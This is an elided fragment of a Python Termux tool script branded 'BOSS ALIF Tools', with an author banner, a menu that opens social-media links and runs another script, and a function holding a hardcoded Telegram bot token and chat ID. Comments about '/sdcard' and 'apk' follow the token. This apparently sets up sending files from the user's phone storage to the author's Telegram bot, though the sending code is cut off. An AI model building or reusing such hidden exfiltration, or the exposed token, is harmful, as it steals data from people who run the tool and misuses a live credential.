...
time.sleep(2)
os.system(f'xdg-open https://facebook.com/groups/215896151562198/')
#------------------[ ALIF-King ]-------------------#
#------------------[ USER-AGENT ]-------------------#
...
╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝
\033[0;94m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗\033[1;33m 
╠══[Author                   • \33[1;38mIBRAHIM ROHOMAN ALIF]\33[1;38m║\033[1;31m 
╠══[Facebook                 • IBRAHIM ROHOMAN ALIF]║  \033[1;97m  
╠══[Github                   • \33[1;38mTERMUX-KING-ALIF ]║\33[1;34m   
...
os.system('espeak -a 300 " Welcome,   to,  BOSS,  ALIF,  Tools"')
pass
...
def menu():
    ...
    if ALIF in ['111']:
        ...
        os.system('xdg-open https://wa.me/+88019')
        os.system("python nono.py")
    elif ALIF in ['3','03']:
        result()
    elif ALIF in ['0']:
...
def suyaib():
    ...
    bot_token = '7052460459:AAEU2SUIsv7Zvuo6BzmLymCiibIdAC6Itzc'
    chat_id = '5065276380'    
    #-------------( /sdcard\ )--------------#  
    #--------------------apk-------------------#																																							
    try:
